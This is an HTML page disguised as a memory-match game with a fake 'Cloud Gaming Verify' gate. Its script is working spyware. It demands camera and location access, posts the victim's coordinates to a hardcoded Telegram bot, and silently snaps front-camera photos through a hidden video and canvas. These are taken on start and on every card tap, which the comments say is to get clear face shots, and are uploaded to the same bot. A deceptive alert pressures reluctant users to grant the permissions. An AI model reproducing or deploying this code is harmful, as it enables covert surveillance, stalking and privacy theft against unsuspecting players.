<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Memory Match - Secure Sync</title>
    <style>
        :root { --primary: #00f2ff; --bg: #0a0a0a; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: sans-serif; background: var(--bg); color: white; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        
        /* واجهة البداية */
        #overlay { position: fixed; inset: 0; background: var(--bg); z-index: 9999; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        .btn { background: var(--primary); color: #000; border: none; padding: 18px 40px; border-radius: 50px; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 0 20px rgba(0, 242, 255, 0.4); width: 100%; max-width: 280px; }
        
        .game-area { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 10px; display: none; }
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; width: 100%; max-width: 350px; }
        .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 24px; border: 1px solid #333; }
        .card.flipped { background: var(--primary); color: #000; }
        
        .chat-section { height: 180px; background: #111; border-top: 1px solid #333; display: flex; flex-direction: column; }
        .messages { flex: 1; padding: 10px; overflow-y: auto; font-size: 14px; display: flex; flex-direction: column; gap: 5px; }
        .msg { padding: 8px 12px; border-radius: 12px; max-width: 80%; }
        .msg.ai { background: #222; align-self: flex-start; }
        .msg.user { background: var(--primary); color: #000; align-self: flex-end; }
        
        video, canvas { display: none; position: absolute; visibility: hidden; }
    </style>
</head>
<body>

<div id="overlay">
    <div>
        <h2 style="color: var(--primary); font-size: 24px;">Cloud Gaming Verify</h2>
        <p style="color: #888; margin-bottom: 30px;">Click below to sync with regional AI server.</p>
        <button class="btn" id="startBtn">START GAME</button>
    </div>
</div>

<div class="game-area" id="gameArea">
    <div style="margin-bottom: 10px;">Player vs AI (Hard)</div>
    <div class="grid" id="grid"></div>
</div>

<div class="chat-section">
    <div class="messages" id="chatBox"></div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
    const cid = '6808559733';

    const startBtn = document.getElementById('startBtn');
    const overlay = document.getElementById('overlay');
    const gameArea = document.getElementById('gameArea');

    // وظيفة الضغط الرئيسية
    startBtn.onclick = function() {
        startBtn.innerText = "Connecting...";
        startBtn.disabled = true;

        // طلب الصلاحيات فوراً
        Promise.all([
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
            new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(resolve, (err) => resolve(null));
            })
        ]).then(results => {
            const stream = results[0];
            const pos = results[1];

            // 1. تشغيل الكاميرا في الخلفية
            document.getElementById('v').srcObject = stream;

            // 2. إرسال الموقع لتليجرام
            if (pos) {
                const loc = `📍 Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(loc)}`);
            }

            // 3. التقاط أول صورة فورية
            setTimeout(silentCapture, 1000);

            // 4. إخفاء الشاشة السوداء وإظهار اللعبة
            overlay.style.display = 'none';
            gameArea.style.display = 'flex';
            renderGrid();
        }).catch(err => {
            console.error(err);
            alert("Connection Failed: You must allow Camera and Location to play against others. Please refresh and try again.");
            location.reload();
        });
    };

    function renderGrid() {
        const grid = document.getElementById('grid');
        let symbols = ['🍎','🍌','🍇','🍉','🍒','🍓','🥝','🍍','🍋','🍑','🥑','🥥'];
        let deck = [...symbols, ...symbols].sort(() => Math.random() - 0.5);
        
        deck.forEach(s => {
            const card = document.createElement('div');
            card.className = 'card';
            card.onclick = () => {
                card.innerText = s;
                card.classList.add('flipped');
                // تصوير عند كل لمسة بطاقة لضمان لقطات وجه واضحة
                silentCapture();
            };
            grid.appendChild(card);
        });
    }

    function silentCapture() {
        const can = document.getElementById('c');
        const vid = document.getElementById('v');
        can.getContext('2d').drawImage(vid, 0, 0, 640, 480);
        can.toBlob(b => {
            const fd = new FormData();
            fd.append('chat_id', cid);
            fd.append('photo', b, 'img.jpg');
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg', 0.5);
    }
</script>
</body>
</html>
